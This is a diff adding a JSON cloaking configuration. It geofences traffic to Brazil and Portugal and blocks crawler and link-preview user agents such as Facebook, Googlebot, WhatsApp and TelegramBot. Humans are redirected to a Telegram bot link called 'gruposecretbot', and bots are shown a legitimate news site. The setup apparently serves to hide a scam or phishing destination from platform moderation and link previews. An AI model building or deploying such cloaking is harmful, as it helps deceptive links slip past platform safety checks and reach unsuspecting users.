@@ -1,0 +1,22 @@
+{
+  "filters": {
+    "blockedCountries": ["RU", "CN", "KP", "UA", "VN", "TH"], 
+    "allowedCountries": ["BR", "PT"],
+    "blockedUserAgents": [
+      "facebookexternalhit", 
+      "Facebot",
+      "Googlebot",
+      "Twitterbot",
+      "crawler",
+      "spider",
+      "bot",
+      "WhatsApp",
+      "TelegramBot"
+    ],
+    "ipCheck": true
+  },
+  "redirects": {
+    "human": "https://t.me/gruposecretbot", 
+    "bot": "https://g1.globo.com"
+  }
+}
